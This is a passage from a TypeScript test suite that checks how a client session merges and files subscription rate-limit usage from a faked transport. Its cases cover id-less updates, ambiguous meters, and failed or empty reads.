    const pending = session.getSubscriptionUsage();
    for (let i = 0; i < 200 && !fake.rateLimitsReadParked(); i++) {
      await new Promise((r) => setTimeout(r, 5));
    }
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        planType: null,
        primary: { usedPercent: 55, windowDurationMins: null, resetsAt: null },
      }),
    });
    fake.releaseRateLimitsRead();
    await pending;
    const usage = await usageOf(session);
    expect(usage.windows[0]).toEqual({
      // Fresher number from the push, metadata from the older read.
      label: "Weekly",
      usedPercent: 55,
      resetsAtMs: 1785000000000,
    });
    // Plan came from the baseline too - the push left it null.
    expect(usage.plan).toBe("plus");
  });

  it("files a keyed read entry under its MAP key, not its nullable limitId", async () => {
    // The response map key is the authoritative metered id; limitId inside the
    // snapshot is nullable metadata. Filing by the latter would drop a
    // { codex: {limitId: null} } entry into the legacy bucket, where it can
    // lose selection to an unrelated meter.
    const fake = new FakeCodexTransport();
    fake.rateLimitsReadResponse = {
      // Historical view, id-less: this is what occupies the legacy bucket.
      rateLimits: snapshot({
        limitId: null,
        primary: { ...week, usedPercent: 4 },
      }),
      // Keyed entry whose own limitId is absent. Filing it by that null would
      // land it on top of the legacy bucket above, and the pill would show 4.
      rateLimitsByLimitId: {
        codex: snapshot({
          limitId: null,
          primary: { ...week, usedPercent: 66 },
        }),
      },
      rateLimitResetCredits: null,
    };
    const { session } = await bootstrapped(fake);
    expect((await usageOf(session)).windows[0].usedPercent).toBe(66);
  });

  it("routes an id-less rolling update to the one bucket it can only mean", async () => {
    // Rolling updates may omit limitId entirely. With a single known meter
    // that is unambiguous, and filing it as a separate legacy bucket would
    // strand the fresher number where nothing displays it.
    const { session, fake } = await bootstrapped();
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        limitId: "codex",
        primary: {
          usedPercent: 20,
          windowDurationMins: 10080,
          resetsAt: 1785000000,
        },
      }),
    });
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        limitId: null,
        planType: null,
        primary: { usedPercent: 47, windowDurationMins: null, resetsAt: null },
      }),
    });
    const usage = await usageOf(session);
    expect(usage.plan).toBe("plus");
    expect(usage.windows[0]).toEqual({
      label: "Weekly",
      usedPercent: 47,
      resetsAtMs: 1785000000000,
    });
  });

  it("drops an id-less update when several meters make it ambiguous", async () => {
    // Misfiling would show one meter's number under another meter's name; the
    // next keyed push or read re-syncs, so dropping is the safe answer.
    const { session, fake } = await bootstrapped();
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({ limitId: "codex" }),
    });
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        limitId: "other-meter",
        primary: { ...week, usedPercent: 9 },
      }),
    });
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        limitId: null,
        primary: { ...week, usedPercent: 99 },
      }),
    });
    // codex bucket still reads its own last known value.
    expect((await usageOf(session)).windows[0].usedPercent).toBe(34.5);
  });

  it("reports 'unknown', not a clear, when the read fails", async () => {
    // An unreachable or unauthenticated read teaches us nothing, so a pill
    // populated from an earlier reading must survive it.
    const fake = new FakeCodexTransport();
    fake.rateLimitsReadError = new Error("not signed in");
    const { session } = await bootstrapped(fake);
    expect(await session.getSubscriptionUsage()).toEqual({ kind: "unknown" });
  });

  it("reports 'unavailable' when a successful read has no rate limits at all", async () => {
    const fake = new FakeCodexTransport();
    fake.rateLimitsReadResponse = {
      rateLimits: null,
      rateLimitsByLimitId: null,
      rateLimitResetCredits: null,
    };
    const { session } = await bootstrapped(fake);
    expect(await session.getSubscriptionUsage()).toEqual({
      kind: "unavailable",
    });
  });
});
